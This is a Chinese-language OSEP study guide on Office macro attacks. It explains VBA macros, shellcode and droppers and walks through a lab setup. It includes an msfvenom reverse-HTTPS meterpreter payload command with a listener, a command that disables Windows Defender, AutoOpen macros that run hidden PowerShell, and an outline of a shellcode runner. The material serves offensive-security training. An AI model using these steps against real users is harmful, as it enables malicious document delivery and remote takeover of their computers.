# Office宏攻击 - 新手章节指南

## 这个目录是干什么的？

这是 OSEP 的第一个实战章节。你将学会如何通过 Office 文档获取目标系统的控制权。这是现实世界中最常见的初始访问方式之一。

---

## 为什么要学这个？

```
现实场景：
├── 攻击者发送一封带附件的邮件
├── 受害者打开 Word/Excel 文档
├── 文档中的宏代码自动执行
├── 攻击者获得受害者电脑的控制权

学习目的：
├── 理解这种攻击是如何工作的
├── 学会检测和防御这类攻击
└── 在授权测试中使用这些技术
```

## 通俗理解核心概念

### 什么是 VBA 宏？

```
VBA = Visual Basic for Applications
    = Office 内置的编程语言

类比：
├── Word/Excel 是一个"机器人"
├── VBA 宏是给机器人的"指令"
├── 打开文档时，机器人会执行这些指令
└── 指令可以是任何事情（包括坏事）

为什么危险？
├── 宏可以调用 Windows API
├── 宏可以执行系统命令
├── 宏可以下载并运行程序
└── 用户往往不知道发生了什么
```

### 什么是 Shellcode？

```
Shellcode = 一段可以直接在内存中执行的机器码

类比：
├── 普通程序 = 需要安装的软件（.exe 文件）
├── Shellcode = 可以直接"注入"运行的代码
└── 就像把药片溶解在水里直接喝，不用吞药片

常见用途：
├── 反向连接（让目标主动连接攻击者）
├── 绑定端口（在目标上开一个后门端口）
└── 执行任意命令
```

### 什么是 Dropper？

```
Dropper = 投递恶意代码的"载体"

类比：
├── Dropper = 快递包裹
├── Payload = 包裹里的东西（Shellcode）
└── 目标 = 收件人

Office 宏就是一种 Dropper：
├── 用户打开文档（收到包裹）
├── 宏代码执行（打开包裹）
├── Shellcode 运行（取出里面的东西）
└── 攻击者获得控制权
```

### Staged vs Non-staged

```
Non-staged（非分阶段）：
├── 所有代码都在一个文件里
├── 类比：一次性把所有东西都寄过去
├── 优点：简单
└── 缺点：文件大，容易被检测

Staged（分阶段）：
├── 先发送一个小的"下载器"
├── 下载器再去下载真正的恶意代码
├── 类比：先寄一张提货单，再去仓库取货
├── 优点：初始文件小，难检测
└── 缺点：需要网络连接
```

## 实操环境搭建

### 你需要准备的环境

```
攻击机（Kali Linux）：
├── 安装 Metasploit Framework
├── 用于生成 Shellcode
└── 用于接收反向连接

目标机（Windows 10/11）：
├── 安装 Microsoft Office（带宏功能）
├── 关闭杀毒软件（学习阶段）
└── 关闭 Windows Defender

网络配置：
├── 两台虚拟机在同一网段
├── 能互相 ping 通
└── 记录各自的 IP 地址
```

### 环境配置步骤

```bash
# 在 Kali Linux 上

# 1. 更新 Metasploit
sudo apt update && sudo apt install metasploit-framework

# 2. 生成测试用的 Shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=你的Kali_IP LPORT=443 -f csharp

# 3. 启动监听器
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 你的Kali_IP
set LPORT 443
run
```

```powershell
# 在 Windows 目标机上

# 1. 关闭 Windows Defender（仅用于学习环境）
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. 允许宏执行
# 打开 Word -> 文件 -> 选项 -> 信任中心 -> 信任中心设置
# -> 宏设置 -> 启用所有宏
```

## 实践任务清单

### 任务1：写你的第一个 VBA 宏

```vba
' 在 Word 中按 Alt+F11 打开 VBA 编辑器
' 插入一个新模块，粘贴以下代码

Sub HelloWorld()
    MsgBox "Hello, Hacker!", vbInformation, "测试"
End Sub

Sub AutoOpen()
    ' 这个函数会在文档打开时自动执行
    HelloWorld
End Sub

' 保存为 .docm 格式（启用宏的文档）
' 关闭后重新打开，会自动弹出消息框
```

### 任务2：VBA 调用 Windows API

```vba
' 声明 Windows API
Private Declare PtrSafe Function MessageBoxA Lib "user32.dll" ( _
    ByVal hWnd As LongPtr, _
    ByVal lpText As String, _
    ByVal lpCaption As String, _
    ByVal uType As Long) As Long

Sub CallWinAPI()
    ' 调用 MessageBox API
    MessageBoxA 0, "这是通过 Win32 API 弹出的!", "API 测试", 0
End Sub

Sub AutoOpen()
    CallWinAPI
End Sub
```

### 任务3：VBA 执行 PowerShell 命令

```vba
Sub RunPowerShell()
    Dim cmd As String
    cmd = "powershell -ep bypass -c ""Write-Host 'Hello from PowerShell'"""

    ' 使用 WScript.Shell 执行命令
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run cmd, 0, True  ' 0=隐藏窗口, True=等待完成
End Sub

Sub AutoOpen()
    RunPowerShell
End Sub
```

### 任务4：理解 Shellcode Runner 的原理

```
Shellcode Runner 的工作流程：

1. 申请内存空间
   └── VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

2. 把 Shellcode 复制到内存
   └── RtlMoveMemory(addr, shellcode, size)

3. 创建线程执行
   └── CreateThread(0, 0, addr, 0, 0, 0)

4. 等待执行完成
   └── WaitForSingleObject(handle, -1)

这就是为什么需要学习 Win32 API！
```
